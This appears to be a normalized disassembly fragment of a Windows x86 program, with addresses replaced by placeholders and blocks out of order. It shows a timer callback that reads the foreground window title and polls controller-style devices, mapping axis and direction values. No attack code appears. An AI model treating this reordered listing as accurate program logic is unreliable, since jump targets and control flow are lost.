lea ecx [ ebp - 0x5c ]
push ecx
push 0x6
mov eax [ ebp - 0x30 ]
push eax
mov edx [ eax ]
call [ edx + 0x18 ]
mov [ ebp - 0x54 ] 0x10
lea ecx [ ebp - 0x5c ]
push ecx
push 0x6
mov eax [ ebp - 0x30 ]
push eax
mov edx [ eax ]
call [ edx + 0x18 ]
mov [ ebp - 0x54 ] 0x14
lea ecx [ ebp - 0x5c ]
push ecx
push 0x6
mov eax [ ebp - 0x30 ]
push eax
mov edx [ eax ]
call [ edx + 0x18 ]
mov [ ebp - 0x54 ] 0x18
lea ecx [ ebp - 0x5c ]
push ecx
push 0x6
mov eax [ ebp - 0x30 ]
push eax
mov edx [ eax ]
call [ edx + 0x18 ]
mov [ ebp - 0x54 ] 0x1c
lea ecx [ ebp - 0x5c ]
push ecx
push 0x6
mov eax [ ebp - 0x30 ]
push eax
mov edx [ eax ]
call [ edx + 0x18 ]
mov ecx [ rw-data ]
mov eax [ ebp - 0x30 ]
mov [ ecx * 4 + rw-data ] eax
inc [ rw-data ]
mov edx [ rw-data ]
cmp edx 0x10
jl r-xdata
mov eax [ rw-data ]
push 0x10
mov ecx rw-data
mov edx rw-data
mov eax [ eax ]
call sub_4826f8
mov edx [ ebp - 0x30 ]
push edx
mov ecx [ edx ]
call [ ecx + 0x8 ]
mov eax 0x1
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov eax 0x1
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
xor eax eax
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
sub_40e8e8
push ebx
push esi
mov eax [ rw-data ]
test eax eax
jle r-xdata
xor eax eax
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
push eax
push sub_40e4b0
push 0x4
push eax
mov edx [ eax ]
call [ edx + 0x10 ]
mov ecx [ rw-data ]
test ecx ecx
jle r-xdata
xor esi esi
mov ebx rw-data
jmp r-xdata
mov eax [ rw-data ]
pop esi
pop ebx
retn
xor esi esi
mov ebx rw-data
jmp r-xdata
mov ecx [ rw-data ]
cmp esi ecx
jl r-xdata
mov ecx [ rw-data ]
cmp esi ecx
jl r-xdata
mov eax [ ebx ]
push eax
mov edx [ eax ]
call [ edx + 0x20 ]
mov ecx [ ebx ]
push ecx
mov eax [ ecx ]
call [ eax + 0x8 ]
xor edx edx
mov [ ebx ] edx
inc esi
add ebx 0x4
mov eax [ ebx ]
push eax
mov edx [ eax ]
call [ edx + 0x1c ]
inc esi
add ebx 0x4
sub_40e96c
push ebx
mov eax [ rw-data ]
mov ecx [ eax + 0x8 ]
xor eax eax
mov edx rw-data
imul ebx eax 0x1a90
add ebx ecx
add ebx 0x8
mov [ edx ] ebx
inc eax
add edx 0x4
cmp eax 0x10
jl r-xdata
pop ebx
retn
sub_40e994
push ebp
mov ebp esp
add esp 0xfffff7d8
push ebx
push esi
mov eax rw-data
call sub_4c517c
push rw-data
call EnterCriticalSection
inc [ rw-data ]
mov edx [ rw-data ]
test edx edx
jne r-xdata
mov edx [ rw-data ]
test edx edx
jle r-xdata
mov ecx [ rw-data ]
and ecx 0x3f
cmp ecx 0x3f
jne r-xdata
inc [ rw-data ]
push rw-data
call LeaveCriticalSection
mov esi [ rw-data ]
call GetForegroundWindow
mov ebx eax
mov [ rw-data ] ebx
cmp ebx esi
setne al
and eax 0x1
mov [ rw-data ] al
test al al
je r-xdata
push rw-data
call LeaveCriticalSection
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
jmp r-xdata
call sub_40e8e8
mov eax [ rw-data ]
test eax eax
jle r-xdata
mov ecx [ rw-data ]
test ecx ecx
jle r-xdata
push 0x400
lea edx [ ebp - 0x428 ]
push edx
push ebx
call GetWindowTextA
push 0x400
lea ecx [ ebp - 0x828 ]
push ecx
mov eax [ rw-data ]
push eax
call sub_41cdd0
add esp 0xc
lea edx [ ebp - 0x428 ]
lea ecx [ ebp - 0x828 ]
mov eax [ rw-data ]
push edx
push ecx
push eax
push rw-data
push rw-data
call sub_41c394
add esp 0x14
mov edx [ rw-data ]
mov ecx [ edx ]
mov eax [ ecx + 0x46c ]
mov dl [ eax + 0x34 ]
test dl dl
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov [ ebp - 0x18 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov eax [ edx ]
push eax
push rw-data
push 0x35f
push rw-data
push rw-data
call sub_41c2dc
add esp 0x14
dec [ ebp - 0xc ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ rw-data ]
mov eax [ ecx ]
call sub_409ba0
push rw-data
call EnterCriticalSection
dec [ rw-data ]
push rw-data
call LeaveCriticalSection
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
call sub_40eb54
lea ecx [ ebp - 0x428 ]
push ecx
lea eax [ ebp - 0x828 ]
push eax
mov edx [ rw-data ]
push edx
call sub_4153d4
add esp 0xc
sub_40eb54
push ebp
mov ebp esp
add esp 0xfffffddc
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
xor edx edx
mov [ rw-data ] edx
xor ecx ecx
lea eax [ ebp - 0xa0 ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x90 ] eax
mov edx [ ebp - 0x90 ]
mov [ edx ] 0x0
inc [ ebp - 0x2c ]
inc [ ebp - 0x90 ]
mov ecx [ ebp - 0x2c ]
cmp ecx 0x10
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x30 ] eax
mov eax [ rw-data ]
mov edx [ ebp - 0x30 ]
mov ecx [ edx ]
mov [ ebp - 0x34 ] ecx
mov edx [ eax + 0x8 ]
mov [ ebp - 0x38 ] edx
mov ecx [ ebp - 0x34 ]
test ecx ecx
jl r-xdata
xor eax eax
mov [ ebp - 0x40 ] eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x34 ]
cmp edx ecx
jle r-xdata
mov edx [ ebp - 0x40 ]
mov ecx [ rw-data ]
cmp edx ecx
jl r-xdata
mov eax [ ebp - 0x30 ]
mov edx [ eax + 0x4 ]
test edx edx
jl r-xdata
mov edx [ ebp - 0x40 ]
mov cl [ ebp + edx - 0xa0 ]
test cl cl
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
imul edi [ ebp - 0x34 ] 0x1a90
mov eax [ ebp - 0x38 ]
add edi eax
add edi 0x8
xor edx edx
mov [ ebp - 0x3c ] edx
mov ecx [ ebp - 0x30 ]
mov eax [ ecx + 0x4 ]
mov [ ebp + eax - 0xa0 ] 0x1
inc [ ebp - 0x40 ]
mov eax [ ebp - 0x40 ]
mov [ ebp + eax - 0xa0 ] 0x1
mov edx [ ebp - 0x40 ]
mov ecx [ edx * 4 + rw-data ]
push ecx
mov eax [ ecx ]
call [ eax + 0x64 ]
lea edx [ ebp - 0xf0 ]
push edx
push 0x50
mov ecx [ ebp - 0x40 ]
mov eax [ ecx * 4 + rw-data ]
push eax
mov edx [ eax ]
call [ edx + 0x24 ]
mov [ ebp - 0x44 ] eax
mov ecx [ ebp - 0x44 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
mov [ ebp - 0x18 ] 0x18
mov edx [ rw-data ]
lea eax [ ebp - 0x4 ]
add edx 0x3c
xor ecx ecx
mov [ ebp - 0x8c ] edx
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8c ]
call sub_41e604
lea ecx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov eax [ ecx ]
push eax
mov edx [ rw-data ]
push edx
call sub_4132d0
add esp 0x8
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov eax [ ebp - 0x3c ]
shl eax 0x2
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
add eax edi
add eax 0xe10
xor edx edx
call sub_40dd38
mov eax [ ebp - 0x3c ]
mov edx 0x3e8
shl eax 0x2
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
add eax edi
add eax 0xe10
call sub_40dd38
jmp r-xdata
xor eax eax
lea ebx [ ebp - 0x200 ]
mov eax [ ebp - 0x44 ]
cmp eax 0x8007000c
je r-xdata
mov ecx [ ebp - 0x3c ]
push ecx
mov eax [ ebp - 0x30 ]
push eax
call sub_411e48
add esp 0x8
test al al
je r-xdata
inc [ ebp - 0x3c ]
mov ecx [ ebp - 0x3c ]
cmp ecx 0x20
jl r-xdata
xor edx edx
mov [ ebx ] edx
inc eax
add ebx 0x4
cmp eax 0x44
jl r-xdata
mov eax [ ebp - 0x38 ]
mov cl [ eax + 0x1a90c ]
test cl cl
je r-xdata
mov ecx [ ebp - 0x40 ]
mov eax [ ecx * 4 + rw-data ]
push eax
mov edx [ eax ]
call [ edx + 0x1c ]
mov ecx [ ebp - 0x40 ]
mov eax [ ecx * 4 + rw-data ]
push eax
mov edx [ eax ]
call [ edx + 0x64 ]
lea ecx [ ebp - 0xf0 ]
push ecx
push 0x50
mov eax [ ebp - 0x40 ]
mov edx [ eax * 4 + rw-data ]
push edx
mov ecx [ edx ]
call [ ecx + 0x24 ]
jmp r-xdata
mov edx [ ebp - 0x44 ]
cmp edx 0x8007001e
jne r-xdata
lea eax [ ebp - 0xf0 ]
xor edx edx
lea ebx [ ebp - 0x200 ]
mov eax [ ebp - 0xec ]
test eax eax
jge r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
jmp r-xdata
mov ecx [ eax ]
test ecx ecx
jle r-xdata
mov ecx [ eax ]
neg ecx
mov [ ebx ] ecx
jmp r-xdata
mov eax [ ebp - 0xec ]
test eax eax
jle r-xdata
mov edx [ ebp - 0xf0 ]
test edx edx
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add ebx 0x8
inc edx
add eax 0x4
cmp edx 0x2
jl r-xdata
mov ecx [ eax ]
mov [ ebx + 0x4 ] ecx
mov eax [ ebp - 0xf0 ]
test eax eax
jge r-xdata
mov edx [ ebp - 0xf0 ]
test edx edx
jge r-xdata
mov eax [ ebp - 0xf0 ]
test eax eax
jle r-xdata
mov ecx [ ebp - 0xec ]
neg ecx
mov [ ebp - 0x17c ] ecx
jmp r-xdata
mov ecx [ eax ]
test ecx ecx
jge r-xdata
lea eax [ ebp - 0xe8 ]
xor edx edx
lea ebx [ ebp - 0x1f0 ]
mov ecx [ ebp - 0xf0 ]
test ecx ecx
jle r-xdata
mov edx [ ebp - 0xf0 ]
neg edx
mov [ ebp - 0x200 ] edx
jmp r-xdata
mov eax [ ebp - 0xf0 ]
test eax eax
jle r-xdata
mov ecx [ ebp - 0xec ]
mov [ ebp - 0x178 ] ecx
jmp r-xdata
mov ecx [ ebp - 0xec ]
neg ecx
mov [ ebp - 0x1f8 ] ecx
jmp r-xdata
mov edx [ ebp - 0xec ]
neg edx
mov [ ebp - 0x180 ] edx
jmp r-xdata
mov ecx [ eax ]
test ecx ecx
jle r-xdata
mov ecx [ eax ]
neg ecx
mov [ ebx ] ecx
jmp r-xdata
mov eax [ ebp - 0xf0 ]
mov [ ebp - 0x1fc ] eax
jmp r-xdata
mov ecx [ ebp - 0xec ]
mov [ ebp - 0x1f4 ] ecx
jmp r-xdata
mov edx [ ebp - 0xec ]
mov [ ebp - 0x174 ] edx
jmp r-xdata
add ebx 0x8
inc edx
add eax 0x4
cmp edx 0x6
jl r-xdata
mov ecx [ eax ]
mov [ ebx + 0x4 ] ecx
mov ecx [ eax ]
test ecx ecx
jge r-xdata
mov eax [ ebp - 0x38 ]
mov dl [ eax + 0x1a90d ]
test dl dl
je r-xdata
xor eax eax
lea ebx [ ebp - 0xd0 ]
xor eax eax
lea ebx [ ebp - 0xd0 ]
mov [ ebp - 0x48 ] eax
mov ecx [ ebx ]
test ecx ecx
jb r-xdata
cmp ecx 0x8ca0
jbe r-xdata
mov edx [ ebx ]
test edx edx
jb r-xdata
mov ecx [ ebx ]
cmp ecx 0x8ca0
jbe r-xdata
mov ecx [ ebx ]
cmp ecx 0x1194
jb r-xdata
cmp ecx 0x1194
ja r-xdata
mov [ ebp + edx * 4 - 0x200 ] 0x3e8
mov edx [ ebx ]
cmp edx 0x8ca
jb r-xdata
mov ecx [ ebx ]
cmp ecx 0x8ca
ja r-xdata
mov [ ebp + eax * 4 - 0x200 ] 0x3e8
mov ecx [ ebx ]
cmp ecx 0x34bc
jb r-xdata
cmp ecx 0x34bc
ja r-xdata
mov edx [ ebx ]
cmp edx 0x1a5e
jb r-xdata
mov ecx [ ebx ]
cmp ecx 0x1a5e
ja r-xdata
mov ecx [ ebx ]
cmp ecx 0x57e4
jb r-xdata
cmp ecx 0x57e4
ja r-xdata
mov [ ebp + edx * 4 - 0x1f8 ] 0x3e8
mov edx [ ebx ]
cmp edx 0x2bf2
jb r-xdata
mov ecx [ ebx ]
cmp ecx 0x2bf2
ja r-xdata
mov [ ebp + eax * 4 - 0x1fc ] 0x3e8
inc eax
add ebx 0x4
cmp eax 0x2
jl r-xdata
cmp ecx 0x7b0c
ja r-xdata
mov [ ebp + edx * 4 - 0x1f0 ] 0x3e8
mov edx [ ebx ]
cmp edx 0x3d86
jb r-xdata
mov ecx [ ebx ]
cmp ecx 0x3d86
ja r-xdata
mov [ ebp + eax * 4 - 0x1f8 ] 0x3e8
mov edx eax
shl edx 0x3
add edx 0x10
mov ecx [ ebx ]
cmp ecx 0x7b0c
jb r-xdata
xor edx edx
lea eax [ ebp - 0x170 ]
lea ebx [ ebp - 0xc0 ]
mov [ ebp + edx * 4 - 0x1e8 ] 0x3e8
mov edx [ ebx ]
cmp edx 0x4f1a
jb r-xdata
mov ecx [ ebx ]
cmp ecx 0x4f1a
ja r-xdata
mov [ ebp + eax * 4 - 0x1f4 ] 0x3e8
inc edx
add eax 0x4
inc ebx
cmp edx 0x20
jl r-xdata
mov [ eax ] 0x3e8
mov edx [ ebx ]
cmp edx 0x60ae
jb r-xdata
mov ecx [ ebx ]
cmp ecx 0x60ae
ja r-xdata
mov [ ebp + eax * 4 - 0x1f0 ] 0x3e8
test [ ebx ] 0x80
je r-xdata
imul edi [ ebp - 0x40 ] 0x1a90
mov eax [ ebp - 0x38 ]
mov edx [ ebp - 0x40 ]
add edi eax
mov [ ebp - 0x4c ] edx
add edi 0x8
xor eax eax
mov edx [ ebx ]
cmp edx 0x7242
jb r-xdata
mov ecx [ ebx ]
cmp ecx 0x7242
ja r-xdata
mov [ ebp + eax * 4 - 0x1ec ] 0x3e8
inc eax
cmp eax 0x44
jl r-xdata
lea ecx [ eax + eax * 4 ]
lea ecx [ ecx + ecx * 4 ]
mov edx [ edi + ecx * 4 ]
cmp edx 0x5
jne r-xdata
inc [ ebp - 0x48 ]
add ebx 0x4
mov eax [ ebp - 0x48 ]
cmp eax 0x2
jl r-xdata
mov ecx [ ebx ]
cmp ecx 0x83d6
ja r-xdata
mov [ ebp + eax * 4 - 0x1e8 ] 0x3e8
mov edx [ ebp + eax * 4 - 0x200 ]
test edx edx
jle r-xdata
mov edx [ ebp - 0x40 ]
mov ecx [ edx * 4 + rw-data ]
cmp edi ecx
je r-xdata
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
mov ecx [ edi + eax * 4 + 0x38 ]
mov [ ebp - 0x4c ] ecx
imul edi [ ebp - 0x4c ] 0x1a90
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x38 ]
add edi eax
add edi 0x8
xor eax eax
mov [ ebp + edx - 0xa0 ] 0x1
mov eax [ ebp - 0x48 ]
shl eax 0x3
add eax 0x10
mov edx [ ebx ]
cmp edx 0x83d6
jb r-xdata
jmp r-xdata
mov [ ebp + eax * 4 - 0x1e4 ] 0x3e8
mov [ ebp - 0x50 ] 0x3f800000
xor edx edx
lea ebx [ ebp - 0x200 ]
mov eax edi
mov eax [ ebp - 0x4c ]
push eax
mov edx [ ebp - 0x40 ]
push edx
push rw-data
push rw-data
call sub_41c394
add esp 0x10
xor ebx ebx
inc edx
add ebx 0x4
add eax 0x64
cmp edx 0x44
jl r-xdata
mov ecx [ ebx ]
test ecx ecx
jle r-xdata
mov edx ebx
mov eax [ ebp - 0x40 ]
shl edx 0x2
mov eax [ eax * 4 + rw-data ]
lea edx [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
add eax edx
call sub_40dd18
mov edx ebx
mov eax [ ebp - 0x40 ]
shl edx 0x2
mov eax [ eax * 4 + rw-data ]
lea edx [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
add eax edx
mov edx ebx
shl edx 0x2
lea edx [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
add edx edi
call sub_40d7d4
jmp r-xdata
mov ecx [ eax ]
cmp ecx 0x4
jne r-xdata
push edi
mov esi rw-data
lea edi [ ebp - 0x218 ]
mov ecx 0x6
[ edi ] [ esi ]
pop edi
mov [ ebp - 0x18 ] 0xc
xor eax eax
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x18 ] 0xc
lea ebx [ ebp - 0x218 ]
mov eax [ ebp - 0x54 ]
cmp eax 0x3
jge r-xdata
fild [ eax + 0x38 ]
fld [ r-xdata ]
fmulp st1
fmul [ ebp - 0x50 ]
fstp [ ebp - 0x50 ]
mov edx ebx
mov eax [ ebp - 0x40 ]
shl edx 0x2
mov eax [ eax * 4 + rw-data ]
lea edx [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
add eax edx
mov edx ebx
shl edx 0x2
lea edx [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
add edx edi
call sub_40d79c
test al al
je r-xdata
mov ecx [ ebp - 0x40 ]
mov [ ecx * 4 + rw-data ] edi
inc ebx
cmp ebx 0x44
jl r-xdata
mov [ ebp - 0x18 ] 0xc
mov esi 0xc
mov esi [ ebx ]
mov [ ebp - 0x18 ] 0xc
lea edx [ esi + esi * 4 ]
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x58 ] eax
lea edx [ edx + edx * 4 ]
mov ecx [ edi + edx * 4 ]
cmp ecx 0x2
jne r-xdata
fild [ ebp + ebx * 4 - 0x200 ]
fmul [ ebp - 0x50 ]
call sub_4ccca0
mov [ ebp + ebx * 4 - 0x200 ] eax
inc esi
cmp esi 0x10
jl r-xdata
lea eax [ ebx + ebx * 4 ]
fild [ ebp + ebx * 4 - 0x200 ]
lea eax [ eax + eax * 4 ]
fmul [ edi + eax * 4 + 0x34 ]
call sub_4ccca0
mov [ ebp + ebx * 4 - 0x200 ] eax
fild [ ebp + esi * 4 - 0x200 ]
fmul [ ebp - 0x50 ]
call sub_4ccca0
mov [ ebp + esi * 4 - 0x200 ] eax
fild [ ebp + esi * 4 - 0x1fc ]
fmul [ ebp - 0x50 ]
call sub_4ccca0
mov [ ebp + esi * 4 - 0x1fc ] eax
mov edx [ ebp - 0x58 ]
fild [ ebp + edx * 4 - 0x200 ]
fmul [ ebp - 0x50 ]
call sub_4ccca0
mov edx [ ebp - 0x58 ]
mov [ ebp + edx * 4 - 0x200 ] eax
mov ecx [ ebp - 0x58 ]
fild [ ebp + ecx * 4 - 0x1fc ]
fmul [ ebp - 0x50 ]
call sub_4ccca0
mov edx [ ebp - 0x58 ]
mov [ ebp + edx * 4 - 0x1fc ] eax
inc [ ebp - 0x54 ]
add ebx 0x8
mov ecx [ ebp - 0x54 ]
cmp ecx 0x3
jl r-xdata
fld [ edi + edx * 4 + 0x34 ]
fld [ r-xdata ]
fxch st1
fucompp
fnstsw ax
sahf
jbe r-xdata
mov ebx esi
mov [ ebp - 0x18 ] 0xc
lea eax [ ebx + ebx * 4 ]
lea eax [ eax + eax * 4 ]
mov edx [ edi + eax * 4 + 0x30 ]
add edx edx
lea edx [ edx + edx * 4 ]
mov ecx [ ebp + ebx * 4 - 0x200 ]
cmp edx ecx
jg r-xdata
mov [ ebp - 0x18 ] 0xc
xor ebx ebx
mov edx [ ebp + esi * 4 - 0x200 ]
test edx edx
jg r-xdata
inc ebx
cmp ebx 0x44
jl r-xdata
cmp ebx 0x4
jl r-xdata
lea edx [ esi + esi * 4 ]
lea edx [ edx + edx * 4 ]
mov ecx [ edi + edx * 4 + 0x30 ]
add ecx ecx
lea ecx [ ecx + ecx * 4 ]
mov [ ebp - 0x5c ] ecx
mov eax [ ebp - 0x58 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
mov edx [ edi + eax * 4 + 0x30 ]
add edx edx
lea edx [ edx + edx * 4 ]
mov [ ebp - 0x60 ] edx
mov ecx [ ebp + esi * 4 - 0x200 ]
mov eax [ ebp + esi * 4 - 0x1fc ]
add ecx eax
mov [ ebp - 0x64 ] ecx
mov edx [ ebp - 0x58 ]
mov eax [ ebp - 0x58 ]
mov ecx [ ebp + edx * 4 - 0x200 ]
mov edx [ ebp + eax * 4 - 0x1fc ]
add ecx edx
mov [ ebp - 0x68 ] ecx
mov ecx [ ebp - 0x5c ]
imul ecx [ ebp - 0x5c ]
mov [ ebp - 0x21c ] ecx
fild [ ebp - 0x21c ]
fstp [ ebp - 0x6c ]
mov eax [ ebp - 0x60 ]
imul [ ebp - 0x60 ]
mov [ ebp - 0x220 ] eax
mov dl [ rw-data ]
fild [ ebp - 0x220 ]
test dl dl
fstp [ ebp - 0x70 ]
fld [ ebp - 0x6c ]
fmul [ ebp - 0x70 ]
fstp [ ebp - 0x74 ]
fild [ ebp - 0x64 ]
fmul [ ebp - 0x70 ]
fild [ ebp - 0x64 ]
fmulp st1
fild [ ebp - 0x68 ]
fmul [ ebp - 0x6c ]
fild [ ebp - 0x68 ]
fmulp st1
faddp st1
fstp [ ebp - 0x78 ]
je r-xdata
mov ecx [ ebp + esi * 4 - 0x1fc ]
test ecx ecx
jg r-xdata
lea eax [ ebx + ebx * 4 ]
lea eax [ eax + eax * 4 ]
mov edx [ edi + eax * 4 ]
test edx edx
je r-xdata
mov [ ebp - 0x18 ] 0x0
mov edx [ ebp - 0x38 ]
mov eax [ edx + 0x1a910 ]
cmp ebx 0x10
jge r-xdata
fld [ ebp - 0x78 ]
fld [ ebp - 0x74 ]
fxch st1
fucompp
fnstsw ax
sahf
jb r-xdata
mov ecx [ ebp + esi * 4 - 0x1fc ]
lea eax [ esi + 0x1 ]
push ecx
push eax
mov edx [ ebp + esi * 4 - 0x200 ]
push edx
push esi
push rw-data
push rw-data
call sub_41c394
add esp 0x18
mov ecx [ ebp - 0x58 ]
mov eax [ ebp + ecx * 4 - 0x1fc ]
push eax
mov edx [ ebp - 0x58 ]
inc edx
push edx
mov ecx [ ebp - 0x58 ]
mov eax [ ebp + ecx * 4 - 0x200 ]
push eax
mov edx [ ebp - 0x58 ]
push edx
push rw-data
push rw-data
call sub_41c394
add esp 0x18
add esp 0xfffffff8
fld [ ebp - 0x74 ]
fstp [ esp ]
add esp 0xfffffff8
fld [ ebp - 0x78 ]
fstp [ esp ]
fld [ ebp - 0x78 ]
fld [ ebp - 0x74 ]
fxch st1
fucompp
fnstsw ax
sahf
setae dl
and edx 0x1
push edx
mov ecx [ ebp - 0x60 ]
push ecx
mov eax [ ebp - 0x5c ]
push eax
mov edx [ ebp - 0x68 ]
push edx
mov ecx [ ebp - 0x64 ]
push ecx
push rw-data
push rw-data
call sub_41c394
add esp 0x2c
mov eax [ ebp - 0x58 ]
mov edx [ ebp + eax * 4 - 0x200 ]
test edx edx
jg r-xdata
mov ecx [ ebp - 0x38 ]
mov eax [ ecx + 0x1a914 ]
jmp r-xdata
lea edx [ esi + esi * 4 ]
lea edx [ edx + edx * 4 ]
mov ecx [ edi + edx * 4 + 0x34 ]
mov [ ebp - 0x7c ] ecx
mov eax [ ebp - 0x58 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
mov edx [ edi + eax * 4 + 0x34 ]
mov [ ebp - 0x80 ] edx
mov ecx [ ebp - 0x64 ]
mov eax [ ebp - 0x68 ]
add ecx eax
mov [ ebp - 0x224 ] ecx
fild [ ebp - 0x224 ]
fdivr [ r-xdata ]
fstp [ ebp - 0x84 ]
fild [ ebp - 0x64 ]
add esp 0xfffffff8
fmul [ ebp - 0x7c ]
fmul [ ebp - 0x84 ]
fild [ ebp - 0x68 ]
fmul [ ebp - 0x80 ]
fmul [ ebp - 0x84 ]
faddp st1
fstp [ ebp - 0x88 ]
fld [ ebp - 0x88 ]
fstp [ esp ]
add esp 0xfffffff8
fld [ ebp - 0x80 ]
fstp [ esp ]
add esp 0xfffffff8
fld [ ebp - 0x7c ]
fstp [ esp ]
push rw-data
push rw-data
call sub_41c394
fild [ ebp + esi * 4 - 0x200 ]
add esp 0x20
fmul [ ebp - 0x88 ]
call sub_4ccca0
mov [ ebp + esi * 4 - 0x200 ] eax
fild [ ebp + esi * 4 - 0x1fc ]
fmul [ ebp - 0x88 ]
call sub_4ccca0
mov [ ebp + esi * 4 - 0x1fc ] eax
mov edx [ ebp - 0x58 ]
fild [ ebp + edx * 4 - 0x200 ]
fmul [ ebp - 0x88 ]
call sub_4ccca0
mov edx [ ebp - 0x58 ]
mov [ ebp + edx * 4 - 0x200 ] eax
mov ecx [ ebp - 0x58 ]
fild [ ebp + ecx * 4 - 0x1fc ]
fmul [ ebp - 0x88 ]
call sub_4ccca0
mov edx [ ebp - 0x58 ]
mov [ ebp + edx * 4 - 0x1fc ] eax
mov ecx [ ebp - 0x58 ]
mov eax [ ebp + ecx * 4 - 0x1fc ]
test eax eax
jle r-xdata
mov [ rw-data ] eax
mov eax ebx
shl eax 0x2
mov edx [ ebp + ebx * 4 - 0x200 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
add eax edi
call sub_40dd38
sub_40f690
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov eax rw-data
call sub_4c517c
xor edx edx
push rw-data
mov [ rw-data ] edx
call InitializeCriticalSection
mov ebx 0x10
mov eax [ rw-data ]
mov dl [ eax + 0x3c ]
test dl dl
je r-xdata
push 0x1
push 0x0
push sub_40e994
mov esi ebx
push esi
push esi
call timeSetEvent
mov [ rw-data ] eax
mov [ ebp - 0x1c ] 0x18
mov edx rw-data
lea eax [ ebp - 0x8 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
inc [ ebp - 0x10 ]
mov edx [ eax ]
push edx
push rw-data
push 0x49b
push rw-data
push rw-data
call sub_41c2dc
add esp 0x14
dec [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x2c ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x1c ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
inc [ ebp - 0x10 ]
mov edx [ eax ]
push edx
push rw-data
push 0x497
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx 0x2
mov eax ebx
cdq
idiv ecx
mov ebx eax
sub_40f794
push ebp
mov ebp esp
add esp 0xffffffd8
mov eax rw-data
call sub_4c517c
mov edx [ rw-data ]
push edx
call timeKillEvent
push rw-data
call DeleteCriticalSection
mov [ ebp - 0x18 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov edx [ eax ]
push edx
push rw-data
push 0x4a2
push rw-data
push rw-data
call sub_41c2dc
add esp 0x14
dec [ ebp - 0xc ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
sub_40f818
push ebp
mov ebp esp
add esp 0xffffffd8
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov eax [ edx ]
push eax
push rw-data
push 0x4a7
push rw-data
push rw-data
call sub_41c2dc
add esp 0x14
dec [ ebp - 0xc ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
push rw-data
call EnterCriticalSection
inc [ rw-data ]
push rw-data
call LeaveCriticalSection
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
sub_40f8a0
push ebp
mov ebp esp
add esp 0xffffffd8
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov eax [ edx ]
push eax
push rw-data
push 0x4bb
push rw-data
push rw-data
call sub_41c2dc
add esp 0x14
dec [ ebp - 0xc ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
push rw-data
call EnterCriticalSection
dec [ rw-data ]
push rw-data
call LeaveCriticalSection
mov ecx [ ebp - 0x28 ]
